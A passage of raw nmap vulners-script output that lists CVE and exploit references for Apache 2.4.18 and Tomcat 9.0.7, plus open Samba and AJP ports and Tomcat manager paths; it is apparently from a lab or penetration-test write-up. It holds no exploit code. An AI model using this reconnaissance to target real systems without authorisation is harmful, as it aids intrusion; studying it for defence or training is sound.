\tMSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/FREEBSD-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tFDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t6.8\thttps://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t*EXPLOIT*\n|     \tCVE-2021-40438\t6.8\thttps://vulners.com/cve/CVE-2021-40438\n|     \tCVE-2020-35452\t6.8\thttps://vulners.com/cve/CVE-2020-35452\n|     \tCVE-2018-1312\t6.8\thttps://vulners.com/cve/CVE-2018-1312\n|     \tCVE-2017-15715\t6.8\thttps://vulners.com/cve/CVE-2017-15715\n|     \t4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t6.8\thttps://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t*EXPLOIT*\n|     \tCVE-2019-10082\t6.4\thttps://vulners.com/cve/CVE-2019-10082\n|     \tCVE-2017-9788\t6.4\thttps://vulners.com/cve/CVE-2017-9788\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t6.0\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t6.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t*EXPLOIT*\n|     \tCVE-2019-0217\t6.0\thttps://vulners.com/cve/CVE-2019-0217\n|     \tEDB-ID:47689\t5.8\thttps://vulners.com/exploitdb/EDB-ID:47689\t*EXPLOIT*\n|     \tCVE-2020-1927\t5.8\thttps://vulners.com/cve/CVE-2020-1927\n|     \tCVE-2019-10098\t5.8\thttps://vulners.com/cve/CVE-2019-10098\n|     \t1337DAY-ID-33577\t5.8\thttps://vulners.com/zdt/1337DAY-ID-33577\t*EXPLOIT*\n|     \tCVE-2016-5387\t5.1\thttps://vulners.com/cve/CVE-2016-5387\n|     \tSSV:96537\t5.0\thttps://vulners.com/seebug/SSV:96537\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1333/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1303/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t5.0\thttps://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t*EXPLOIT*\n|     \tEXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t*EXPLOIT*\n|     \tEXPLOITPACK:2666FB0676B4B582D689921651A30355\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355\t*EXPLOIT*\n|     \tEDB-ID:40909\t5.0\thttps://vulners.com/exploitdb/EDB-ID:40909\t*EXPLOIT*\n|     \tCVE-2021-34798\t5.0\thttps://vulners.com/cve/CVE-2021-34798\n|     \tCVE-2021-33193\t5.0\thttps://vulners.com/cve/CVE-2021-33193\n|     \tCVE-2021-26690\t5.0\thttps://vulners.com/cve/CVE-2021-26690\n|     \tCVE-2020-1934\t5.0\thttps://vulners.com/cve/CVE-2020-1934\n|     \tCVE-2019-17567\t5.0\thttps://vulners.com/cve/CVE-2019-17567\n|     \tCVE-2019-0220\t5.0\thttps://vulners.com/cve/CVE-2019-0220\n|     \tCVE-2019-0196\t5.0\thttps://vulners.com/cve/CVE-2019-0196\n|     \tCVE-2018-17199\t5.0\thttps://vulners.com/cve/CVE-2018-17199\n|     \tCVE-2018-17189\t5.0\thttps://vulners.com/cve/CVE-2018-17189\n|     \tCVE-2018-1333\t5.0\thttps://vulners.com/cve/CVE-2018-1333\n|     \tCVE-2018-1303\t5.0\thttps://vulners.com/cve/CVE-2018-1303\n|     \tCVE-2017-9798\t5.0\thttps://vulners.com/cve/CVE-2017-9798\n|     \tCVE-2017-15710\t5.0\thttps://vulners.com/cve/CVE-2017-15710\n|     \tCVE-2016-8743\t5.0\thttps://vulners.com/cve/CVE-2016-8743\n|     \tCVE-2016-8740\t5.0\thttps://vulners.com/cve/CVE-2016-8740\n|     \tCVE-2016-4979\t5.0\thttps://vulners.com/cve/CVE-2016-4979\n|     \t1337DAY-ID-28573\t5.0\thttps://vulners.com/zdt/1337DAY-ID-28573\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t4.9\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t*EXPLOIT*\n|     \tCVE-2019-0197\t4.9\thttps://vulners.com/cve/CVE-2019-0197\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1302/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1301/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-10092/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t*EXPLOIT*\n|     \tEDB-ID:47688\t4.3\thttps://vulners.com/exploitdb/EDB-ID:47688\t*EXPLOIT*\n|     \tCVE-2020-11985\t4.3\thttps://vulners.com/cve/CVE-2020-11985\n|     \tCVE-2019-10092\t4.3\thttps://vulners.com/cve/CVE-2019-10092\n|     \tCVE-2018-1302\t4.3\thttps://vulners.com/cve/CVE-2018-1302\n|     \tCVE-2018-1301\t4.3\thttps://vulners.com/cve/CVE-2018-1301\n|     \tCVE-2018-11763\t4.3\thttps://vulners.com/cve/CVE-2018-11763\n|     \tCVE-2016-4975\t4.3\thttps://vulners.com/cve/CVE-2016-4975\n|     \tCVE-2016-1546\t4.3\thttps://vulners.com/cve/CVE-2016-1546\n|     \t4013EC74-B3C1-5D95-938A-54197A58586D\t4.3\thttps://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D\t*EXPLOIT*\n|     \t1337DAY-ID-33575\t4.3\thttps://vulners.com/zdt/1337DAY-ID-33575\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tCVE-2018-1283\t3.5\thttps://vulners.com/cve/CVE-2018-1283\n|     \tCVE-2016-8612\t3.3\thttps://vulners.com/cve/CVE-2016-8612\n|     \tPACKETSTORM:152441\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:152441\t*EXPLOIT*\n|     \tEDB-ID:46676\t0.0\thttps://vulners.com/exploitdb/EDB-ID:46676\t*EXPLOIT*\n|     \tEDB-ID:42745\t0.0\thttps://vulners.com/exploitdb/EDB-ID:42745\t*EXPLOIT*\n|     \t1337DAY-ID-663\t0.0\thttps://vulners.com/zdt/1337DAY-ID-663\t*EXPLOIT*\n|     \t1337DAY-ID-601\t0.0\thttps://vulners.com/zdt/1337DAY-ID-601\t*EXPLOIT*\n|     \t1337DAY-ID-4533\t0.0\thttps://vulners.com/zdt/1337DAY-ID-4533\t*EXPLOIT*\n|     \t1337DAY-ID-3109\t0.0\thttps://vulners.com/zdt/1337DAY-ID-3109\t*EXPLOIT*\n|_    \t1337DAY-ID-2237\t0.0\thttps://vulners.com/zdt/1337DAY-ID-2237\t*EXPLOIT*\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-jsonp-detection: Couldn&#039;t find any JSONP endpoints.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n8009/tcp open  ajp13       syn-ack ttl 61 Apache Jserv (Protocol v1.3)\n8080/tcp open  http        syn-ack ttl 61 Apache Tomcat 9.0.7\n| http-enum: \n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 )\n|   /manager/html: Apache Tomcat (401 )\n|_  /docs/: Potentially interesting folder\n|_http-jsonp-detection: Couldn&#039;t find any JSONP endpoints.\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n| vulners: \n|   cpe:/a:apache:tomcat:9.0.7: \n|     \tB41082A1-4177-53E2-A74C-8ABA13AA3E86\t10.0\thttps://vulners.com/githubexploit/B41082A1-4177-53E2-A74C-8ABA13AA3E86\t*EXPLOIT*\n|     \tTOMCAT:5FF617CEB667027ABB70FDFB3A8FFD4C\t9.3\thttps://vulners.com/tomcat/TOMCAT:5FF617CEB667027ABB70FDFB3A8FFD4C\n|     \tSMNTC-107906\t9.3\thttps://vulners.com/symantec/SMNTC-107906\n|     \tPACKETSTORM:153506\t9.3\thttps://vulners.com/packetstorm/PACKETSTORM:153506\t*EXPLOIT*\n|     \tMSF:EXPLOIT/WINDOWS/HTTP/TOMCAT_CGI_CMDLINEARGS\t9.3\thttps://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/TOMCAT_CGI_CMDLINEARGS\t*EXPLOIT*\n|     \tEDB-ID:47073\t9.3\thttps://vulners.com/exploitdb/EDB-ID:47073\t*EXPLOIT*\n|     \tDB8D8364-06FB-55E8-934E-C013B00821B5\t9.3\thttps://vulners.com/githubexploit/DB8D8364-06FB-55E8-934E-C013B00821B5\t*EXPLOIT*\n|     \t3A26C086-A741-585B-8FA9-F90780E2CA16\t9.3\thttps://vulners.com/githubexploit/3A26C086-A741-585B-8FA9-F90780E2CA16\t*EXPLOIT*\n|     \t1337DAY-ID-32925\t9.3\thttps://vulners.com/zdt/1337DAY-ID-32925\t*EXPLOIT*\n|     \tTOMCAT:BE665F9148D024F7474C0628515C3A37\t7.5\thttps://vulners.com/tomcat/TOMCAT:BE665F9148D024F7474C0628515C3A37\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-8014/\t7.5\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-8014/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2020-1938/\t7.5\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-1938/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1938/\t7.5\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1938/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2020-1938/\t7.5\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2020-1938/\t*EXPLOIT*\n|     \tEDB-ID:49039\t7.5\thttps://vulners.com/exploitdb/EDB-ID:49039\t*EXPLOIT*\n|     \tCVE-2020-1938\t7.5\thttps://vulners.com/cve/CVE-2020-1938\n|     \tCVE-2018-8014\t7.5\thttps://vulners.com/cve/CVE-2018-8014\n|     \tC3759325-98F9-5F0F-98F5-6EAE787CE3FB\t7.5\thttps://vulners.com/githubexploit/C3759325-98F9-5F0F-98F5-6EAE787CE3FB\t*EXPLOIT*\n|     \t7130E91B-2DF2-565E-ADE8-4C60D45E5A4D\t7.5\thttps://vulners.com/githubexploit/7130E91B-2DF2-565E-ADE8-4C60D45E5A4D\t*EXPLOIT*\n|     \t6E0425A5-AA6D-5FC6-9F8C-415345C30DD5\t7.5\thttps://vulners.com/githubexploit/6E0425A5-AA6D-5FC6-9F8C-415345C30DD5\t*EXPLOIT*\n|     \t1638D72C-F3EB-52FB-B16F-5F1996A67C0A\t7.5\thttps://vulners.com/githubexploit/1638D72C-F3EB-52FB-B16F-5F1996A67C0A\t*EXPLOIT*\n|     \t140968B5-6F8E-57C6-8A61-831D5FB78836\t7.5\thttps://vulners.com/githubexploit/140968B5-6F8E-57C6-8A61-831D5FB78836\t*EXPLOIT*\n|     \t0B52DD25-4874-54EB-8213-8FA10B0966A3\t7.5\thttps://vulners.com/githubexploit/0B52DD25-4874-54EB-8213-8FA10B0966A3\t*EXPLOIT*\n|     \tTOMCAT:3535F2AFC77921EE4AD662129D83A68D\t5.8\thttps://vulners.com/tomcat/TOMCAT:3535F2AFC77921EE4AD662129D83A68D\n|     \tCVE-2021-30640\t5.8\thttps://vulners.com/cve/CVE-2021-30640\n|     \tCVE-2020-1935\t5.8\thttps://vulners.com/cve/CVE-2020-1935\n|     \tTOMCAT:34D1BB5AAB77A4FA5A232BB1CC1DBE12\t5.1\thttps://vulners.com/tomcat/TOMCAT:34D1BB5AAB77A4FA5A232BB1CC1DBE12\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2019-17563/\t5.1\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2019-17563/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-17563/\t5.1\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-17563/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-17563/\t5.1\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-17563/\t*EXPLOIT*\n|     \tCVE-2019-17563\t5.1\thttps://vulners.com/cve/CVE-2019-17563\n|     \tTOMCAT:E0D7CC4566625A34425D5CE3D847746F\t5.0\thttps://vulners.com/tomcat/TOMCAT:E0D7CC4566625A34425D5CE3D847746F\n|     \tTOMCAT:C878975BAAD7823EE793B63FC6053125\t5.0\thttps://vulners.com/tomcat/TOMCAT:C878975BAAD7823EE793B63FC6053125\n|     \tTOMCAT:C3F367059A3E9B8636ED41FF901D93F9\t5.0\thttps://vulners.com/tomcat/TOMCAT:C3F367059A3E9B8636ED41FF901D93F9\n|     \tTOMCAT:A0B0592E070D3A4A393867C40FBB81D8\t5.0\thttps://vulners.com/tomcat/TOMCAT:A0B0592E070D3A4A393867C40FBB81D8\n|     \tTOMCAT:42FCCA1B939943E71978F85565FFC5D2\t5.0\thttps://vulners.com/tomcat/TOMCAT:42FCCA1B939943E71978F85565FFC5D2\n|     \tTOMCAT:3C894B78CB6026265DCB4F6CBB52E528\t5.0\thttps://vulners.com/tomcat/TOMCAT:3C894B78CB6026265DCB4F6CBB52E528\n|     \tTOMCAT:324E50A03961FCE2265C4097A2D9383A\t5.0\thttps://vulners.com/tomcat/TOMCAT:324E50A03961FCE2265C4097A2D9383A\n|     \tTOMCAT:1ACD2AE0B03FBB401CCE27D5C801BE3B\t5.0\thttps://vulners.com/tomcat/TOMCAT:1ACD2AE0B03FBB401CCE27D5C801BE3B\n|     \tTOMCAT:045D264F03959F4DF2D140C7A3C6A05B\t5.0\thttps://vulners.com/tomcat/TOMCAT:045D264F03959F4DF2D140C7A3C6A05B\n|     \tTOMCAT:03526B264C3CCDD4C74F8B8FBF02E5E4\t5.0\thttps://vulners.com/tomcat/TOMCAT:03526B264C3CCDD4C74F8B8FBF02E5E4\n|     \tSSV:99316\t5.0\thttps://vulners.com/seebug/SSV:99316\t*EXPLOIT*\n|     \tSMNTC-108874\t5.0\thttps://vulners.com/symantec/SMNTC-108874\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-8034/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-8034/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1336/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1336/\t*EXPLOIT*\n|     \tCVE-2021-42340\t5.0\thttps://vulners.com/cve/CVE-2021-42340\n|     \tCVE-2021-33037\t5.0\thttps://vulners.com/cve/CVE-2021-33037\n|     \tCVE-2021-25122\t5.0\thttps://vulners.com/cve/CVE-2021-25122\n|     \tCVE-2020-17527\t5.0\thttps://vulners.com/cve/CVE-2020-17527\n|     \tCVE-2020-13935\t5.0\thttps://vulners.com/cve/CVE-2020-13935\n|     \tCVE-2020-13934\t5.0\thttps://vulners.com/cve/CVE-2020-13934\n|     \tCVE-2020-11996\t5.0\thttps://vulners.com/cve/CVE-2020-11996\n|     \tCVE-2019-10072\t5.0\thttps://vulners.com/cve/CVE-2019-10072\n|     \tCVE-2019-0199\t5.0\thttps://vulners.com/cve/CVE-2019-0199\n|     \tCVE-2018-8034\t5.0\thttps://vulners.com/cve/CVE-2018-8034\n|     \tCVE-2018-1336\t5.0\thttps://vulners.com/cve/CVE-2018-1336\n|     \t18F5237C-DCAC-5831-AED6-F0880A11DFF2\t5.0\thttps://vulners.com/githubexploit/18F5237C-DCAC-5831-AED6-F0880A11DFF2\t*EXPLOIT*\n|     \tTOMCAT:F551C8E09F0122E8322CF8CB981AC710\t4.4\thttps://vulners.com/tomcat/TOMCAT:F551C8E09F0122E8322CF8CB981AC710\n|     \tTOMCAT:A01991EC43D0F6A28E9CB4553C6B4670\t4.4\thttps://vulners.com/tomcat/TOMCAT:A01991EC43D0F6A28E9CB4553C6B4670\n|     \tMSF:ILITIES/SUSE-CVE-2019-12418/\t4.4\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-12418/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-12418/\t4.4\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-12418/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-12418/\t4.4\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-12418/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-12418/\t4.4\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-12418/\t*EXPLOIT*\n|     \tF60737C1-A24B-51C1-AE8D-73A65C778FFF\t4.4\thttps://vulners.com/githubexploit/F60737C1-A24B-51C1-AE8D-73A65C778FFF\t*EXPLOIT*\n|     \tE95D9A0E-E9DE-5D95-9879-E07C0257318C\t4.4\thttps://vulners.com/githubexploit/E95D9A0E-E9DE-5D95-9879-E07C0257318C\t*EXPLOIT*\n|     \tD5CBA0E2-A4B0-52CE-B93B-F433CE8662DA\t4.4\thttps://vulners.com/githubexploit/D5CBA0E2-A4B0-52CE-B93B-F433CE8662DA\t*EXPLOIT*\n|     \tCVE-2021-25329\t4.4\thttps://vulners.com/cve/CVE-2021-25329\n|     \tCVE-2020-9484\t4.4\thttps://vulners.com/cve/CVE-2020-9484\n|     \tCVE-2019-12418\t4.4\thttps://vulners.com/cve/CVE-2019-12418\n|     \tC4EDB405-454C-5160-9A99-21A930740C3F\t4.4\thttps://vulners.com/githubexploit/C4EDB405-454C-5160-9A99-21A930740C3F\t*EXPLOIT*\n|     \tB0BA17F5-F171-5C97-9F6C-D5F38B5B64F5\t4.4\thttps://vulners.com/githubexploit/B0BA17F5-F171-5C97-9F6C-D5F38B5B64F5\t*EXPLOIT*\n|     \t743F51FB-8BF4-5425-AEFA-10B2A14C8F3B\t4.4\thttps://vulners.com/githubexploit/743F51FB-8BF4-5425-AEFA-10B2A14C8F3B\t*EXPLOIT*\n|     \t5602A60A-886A-598C-99B3-EE2E820506AD\t4.4\thttps://vulners.com/githubexploit/5602A60A-886A-598C-99B3-EE2E820506AD\t*EXPLOIT*\n|     \t504D019A-423C-50A0-9677-93192F0ECDFC\t4.4\thttps://vulners.com/githubexploit/504D019A-423C-50A0-9677-93192F0ECDFC\t*EXPLOIT*\n|     \t4278B435-D22E-57E8-ABC4-639BAAFA6FC9\t4.4\thttps://vulners.com/githubexploit/4278B435-D22E-57E8-ABC4-639BAAFA6FC9\t*EXPLOIT*\n|     \t14CD7401-C309-52B2-B4EE-AD54900F0455\t4.4\thttps://vulners.com/githubexploit/14CD7401-C309-52B2-B4EE-AD54900F0455\t*EXPLOIT*\n|     \tTOMCAT:6B8125EDA215F510A527D712FEF3FF0A\t4.3\thttps://vulners.com/tomcat/TOMCAT:6B8125EDA215F510A527D712FEF3FF0A\n|     \tTOMCAT:1CE79F1FB24CB690F26B87530FB0DBF3\t4.3\thttps://vulners.com/tomcat/TOMCAT:1CE79F1FB24CB690F26B87530FB0DBF3\n|     \tSMNTC-105524\t4.3\thttps://vulners.com/symantec/SMNTC-105524\n|     \tPACKETSTORM:163457\t4.3\thttps://vulners.com/packetstorm/PACKETSTORM:163457\t*EXPLOIT*\n|     \tPACKETSTORM:163456\t4.3\thttps://vulners.com/packetstorm/PACKETSTORM:163456\t*EXPLOIT*\n|     \tMSF:ILITIES/JRE-VULN-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/JRE-VULN-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-JAVA-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-JAVA-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-0221/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-0221/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-0221/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-0221/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-2684/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-2684/\t*EXPLOIT*\n|     